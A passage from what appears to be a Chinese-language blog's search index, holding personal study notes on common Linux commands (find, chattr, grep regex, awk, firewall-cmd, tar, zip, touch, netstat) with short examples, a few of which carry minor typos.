##查找&#x2F;home中user有读写的权限且group至少有读权限且other有读的权限的文件。（四个条件,rw-r–r–）</p><p>find &#x2F;etc&#x2F; -name *.conf -exec cp -rp {} &#x2F;tmp ;   ##把&#x2F;etc&#x2F;目录下名称中带有.conf的文件递归复制到&#x2F;home下</p><p>find &#x2F;tmp -name “*.conf” -exec rm -rf {} ; ##删除&#x2F;home名称中带有.conf的文件</p><p>find &#x2F; -group mail -exec cp -rp {} &#x2F;tmp ; ##把&#x2F;目录下的组属于mail的文件复制到&#x2F;tmp</p><h3 id="chattr命令"><a href="#chattr命令" class="headerlink" title="chattr命令"></a>chattr命令</h3><h4 id="格式"><a href="#格式" class="headerlink" title="格式:"></a>格式:</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">chattr <span class="hljs-selector-attr">[-RV]</span><span class="hljs-selector-attr">[-v&lt;版本编号&gt;]</span><span class="hljs-selector-attr">[+/-/=&lt;属性&gt;]</span><span class="hljs-selector-attr">[文件或目录...]</span><br></code></pre></td></tr></table></figure><h4 id="OPTIONS-选项"><a href="#OPTIONS-选项" class="headerlink" title="OPTIONS(选项)"></a>OPTIONS(选项)</h4><pre><code class="hljs">-V     详尽地给出chattr的输出信息并打印出程序的版本.-R    递归地修改目录以及其下内容的属性.如果在递归目录时遇到了符号链接,遍历将跳过.-v version  设置文件系统的版本.</code></pre><p>​<br>​    设置了’i’属性的文件不能进行修改:你既不能删除它,<br>​           也不能给它重新命名,你不能对该文件创建链接,<br>​           而且也不能对该文件写入任何数据.  只有超级用户可以设置或清除该属性.<br>​<br>​     示例:<br>​<br>​    chattr +i 1.txt<br>​<br>​    rm -rf 1.txt<br>​<br>​    rm: 无法删除”1.txt”: 不允许的操作 (+i表示不允许任意更动文件或目录,-i是解除+i参数的锁定)</p><p>​<br>​    </p><h3 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h3><p>用于筛选查询结果</p><h4 id="格式-1"><a href="#格式-1" class="headerlink" title="格式:"></a>格式:</h4><p> grep [option] pattern file</p><p>-o：仅显示匹配到的字符串</p><p>-v：显示不被pattern 匹配到的行，相当于[^] 反向匹配</p><p> -i:   忽略字符大小写的差别。</p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><h5 id="匹配字符"><a href="#匹配字符" class="headerlink" title="匹配字符"></a>匹配字符</h5><ul><li><p>. 匹配任意单个字符，不能匹配空行</p></li><li><p>[] 匹配指定范围内的任意单个字符</p></li><li><p>[^] 取反 • [:alnum:] 或 [0-9a-zA-Z] </p></li><li><p>[:alpha:] 或 [a-zA-Z] • [:upper:] 或 [A-Z] </p></li><li><p>[:lower:] 或 [a-z] • [:blank:] 空白字符（空格和制表符）</p></li><li><p>[:space:] 水平和垂直的空白字符（比[:blank:]包含的范围广）</p></li><li><p>[:cntrl:] 不可打印的控制字符（退格、删除、警铃…）</p></li><li><p>[:digit:] 十进制数字 或[0-9] </p></li><li><p>[:xdigit:]十六进制数字 </p></li><li><p>[:graph:] 可打印的非空白字符 </p></li><li><p>[:print:] 可打印字符 </p></li><li><p>[:punct:] 标点符号</p></li></ul><h5 id="匹配次数"><a href="#匹配次数" class="headerlink" title="匹配次数"></a>匹配次数</h5><p>格式</p><ul><li><p>匹配前面的字符任意次，包括0次，贪婪模式：尽可能长的匹配 </p></li><li><p>.* 任意长度的任意字符，包括0次</p></li><li><p>{n} 匹配前面的字符n次 </p></li><li><p>{m,n} 匹配前面的字符至少m 次，至多n次</p></li></ul><p> 位置锚定：定位出现的位置</p><p>格式</p><ul><li>^ 行首锚定，用于模式的最左侧 </li><li>$ 行尾锚定，用于模式的最右侧</li></ul><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>awk是一种编程语言，用于在linux&#x2F;unix下对文本和数据进行处理。数据可以来自标准输入(stdin)、一个或多个文件，或其它命令的输出。它支 持用户自定义函数和动态正则表达式等先进功能，是linux&#x2F;unix下的一个强大编程工具。它在命令行中使用，但更多是作为脚本来使用。</p><h4 id="格式-2"><a href="#格式-2" class="headerlink" title="格式:"></a>格式:</h4><ul><li>FS ：输入字段分隔符，默认为空白字符 </li><li>OFS ：输出字段分隔符，默认为空白字符 </li><li>RS ：输入记录分隔符，指定输入时的换行符，原换行符仍有效</li><li>ORS ：输出记录分隔符，输出时用指定符号代替换行符 </li><li>NF ：字段数量，共有多少字段， $NF引用最后一列，$(NF-1)引用倒数第2列</li></ul><h4 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">awk -F: <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><h3 id="firewall-cmd"><a href="#firewall-cmd" class="headerlink" title="firewall-cmd"></a>firewall-cmd</h3><h4 id="区域"><a href="#区域" class="headerlink" title="区域"></a>区域</h4><p>概念 firewalld将网卡对应到不同的区域（zone），zone 默认共有9个，block dmz drop external home internal public trusted work. </p><p>不同的区域之间的差异是其对待数据包的默认行为不同，根据区域名字我们可以很直观的知道该区域的 特征，在CentOS7系统中，默认区域被设置为public.</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">[<span class="hljs-symbol">root@</span>CGW4700 ~]$ firewall-cmd --<span class="hljs-keyword">get</span>-zones work drop <span class="hljs-keyword">internal</span> <span class="hljs-keyword">external</span> trusted home dmz <span class="hljs-keyword">public</span> block <span class="hljs-comment">// firewalld的所有区域</span><br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">root@CGW4700 ~</span>]$ firewall-cmd --<span class="hljs-keyword">get</span>-<span class="hljs-literal">default</span>-zone <span class="hljs-keyword">public</span> <span class="hljs-comment">// 默认的</span><br></code></pre></td></tr></table></figure><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">放行端口:<br><br><span class="hljs-string">firewall-cmd</span> <span class="hljs-built_in">--add-port=??/???</span>  <span class="hljs-built_in">--permanet</span>     <br><br><span class="hljs-comment">#??为端口号 ???为协议类型,例如tcp,udp</span><br><br><span class="hljs-string">firewall-cmd</span> <span class="hljs-built_in">--reload</span> <span class="hljs-comment">#重载</span><br></code></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@CGW4700</span> ~]<span class="hljs-variable">$ </span>systemctl start firewalld.service  <span class="hljs-comment">#开启防火墙</span><br></code></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@CGW4700</span> ~]<span class="hljs-variable">$ </span>systemctl enable firewalld.service  <span class="hljs-comment">#把firewalld加入到系统服务中</span><br></code></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@CGW4700</span> ~]<span class="hljs-variable">$ </span>systemctl disable firewalld.service  <span class="hljs-comment">#把firewalld从系统服务中移除</span><br></code></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@CGW4700</span> ~]<span class="hljs-variable">$ </span>systemctl status firewalld.service <span class="hljs-comment">#查看防火墙状态</span><br></code></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@CGW4700</span> ~]<span class="hljs-variable">$ </span>firewall-cmd --state <span class="hljs-comment"># 查看防火墙状态(其二)</span><br></code></pre></td></tr></table></figure><p>假设自定义的ssh端口为12222，使用下面的命令动态添加一条防火墙规则 </p><p># 使用–permanent参数配置的规则，会添加到zone配置文件中，未指定则默认 </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[root@CGW4700 ~]</span>$ firewall-cmd <span class="hljs-attr">--add-port</span>=<span class="hljs-number">12222</span>/tcp <span class="hljs-attr">--permanent</span><br></code></pre></td></tr></table></figure><p> 防火墙的配置文件也可以手动修改，修改后记得重载 # 重读防火墙，并不中断用户连接，即不丢失状态信息 </p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@CGW4700</span> ~]<span class="hljs-variable">$ </span>firewall-cmd --reload<br></code></pre></td></tr></table></figure><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">启用???服务</span><br><span class="hljs-comment">firewall</span><span class="hljs-literal">-</span><span class="hljs-comment">cmd</span> <span class="hljs-literal">--</span><span class="hljs-comment">add</span><span class="hljs-literal">-</span><span class="hljs-comment">service=???</span> <span class="hljs-literal">--</span><span class="hljs-comment">permanet</span><br><br><span class="hljs-comment">firewall</span><span class="hljs-literal">-</span><span class="hljs-comment">cmd</span> <span class="hljs-literal">--</span><span class="hljs-comment">reload</span><br></code></pre></td></tr></table></figure><h3 id="tar命令"><a href="#tar命令" class="headerlink" title="tar命令"></a>tar命令</h3><h4 id="压缩文件"><a href="#压缩文件" class="headerlink" title="压缩文件"></a>压缩文件</h4><p>tar -cvf 用户自定义的压缩文件名 想要压缩的文件或目录 -C 存放压缩文件的位置</p><p>示例:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">tar -cvf user.tar.gz <span class="hljs-regexp">/home/m</span>aster<span class="hljs-regexp">/ -C /</span>home<br></code></pre></td></tr></table></figure><h4 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a>解压文件</h4><p>tar -xvf </p><p>示例:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">tar xvf <span class="hljs-regexp">/home/u</span>ser.tar.gz<br></code></pre></td></tr></table></figure><h4 id="zip命令"><a href="#zip命令" class="headerlink" title="zip命令"></a>zip命令</h4><p>zip是压缩工具，unzip是解压工具 </p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-q：不显示指令执行过程；</span><br><br><span class="hljs-deletion">-r：递归处理，将指定目录下的所有文件和子目录一并处理；</span><br></code></pre></td></tr></table></figure><p>路径和参数与tar命令的位置相同</p><h3 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#创建隐藏文件</span><br><br>touch  <span class="hljs-regexp">/home/</span>admin/.<span class="hljs-number">1</span>.txt <br><br>touch  <span class="hljs-regexp">/home/</span>admin/..<span class="hljs-number">1</span>.txt <br></code></pre></td></tr></table></figure><p>touch -acmr 文件2 文件1</p><p>文件2的mtime ,atime会变成文件1的    (修改系统时间会影响文件的ctime )</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建文件</span><br><span class="hljs-built_in">touch</span> [路径]文件名 <br></code></pre></td></tr></table></figure><h3 id="netstat命令"><a href="#netstat命令" class="headerlink" title="netstat命令"></a>netstat命令</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">查看服务器开放了哪些端口<br><br>netstat -anp<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
